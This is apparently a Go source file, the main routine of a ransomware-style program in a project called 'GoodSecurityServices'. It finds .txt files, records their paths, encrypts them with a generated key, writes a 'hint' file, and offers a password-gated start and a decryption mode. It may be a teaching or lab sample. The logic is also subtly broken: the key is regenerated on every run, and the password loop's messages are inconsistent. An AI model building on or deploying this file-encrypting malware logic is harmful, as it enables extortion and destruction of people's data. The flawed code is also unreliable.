package main

import (
	"GoodSecurityServices/decryption"
	"GoodSecurityServices/encryption"
	"GoodSecurityServices/gettarget"
	"GoodSecurityServices/utility"
	"bufio"
	"fmt"
	"os"
)

// Global variables for the program
var (
	fileExtensions   = []string{".txt"}                 // File extensions to target
	decryptingOption = true                             // Option to decrypt files
	passwordOption   = true                             // Option to ask for password
	passwordKey      = "Exit"                           // Password to start the program
	pathData         = "file_paths.txt"                 // File to store file paths
	hint             = "HelloThere.txt"                 // Hint file
	skipFile         = []string{"file_paths.txt", hint} // File to skip
)

func main() {
	// key
	key, err := encryption.GenerateEncryptionKey()
	if err != nil {
		panic(err)
	}
	if decryptingOption {
		// if have argument, run the program in decryption mode
		if len(os.Args) > 1 {
			if os.Args[1] == "decryption" {
				decryption.Start(pathData, skipFile, key)
				os.Exit(0)
			}
		}
	}

	if passwordOption {
		// asking for password
		fmt.Println("Enter password: ")

		// Create a scanner to read user input
		scanner := bufio.NewScanner(os.Stdin)

		// Loop until the user enters something
		for scanner.Scan() {
			// Read the input
			password := scanner.Text()

			// Check if the input is not empty
			if password != "10101" {
				fmt.Println("You entered:", password)
				if password == passwordKey {
					break // Exit the loop if input is provided
				}
			}

			// If input is empty, prompt again
			fmt.Println("Password cannot be empty. Please enter a password:")
		}

		// Check if there was an error scanning input
		if err := scanner.Err(); err != nil {
			fmt.Fprintln(os.Stderr, "error reading input:", err)
		}
	}

	gettarget.Findpath(fileExtensions, pathData)
	encryption.Start(pathData, skipFile, key)
	encryptionKey := utility.GenerateRandomKey(32)
	utility.GenerateHintFile(hint, encryptionKey)
}
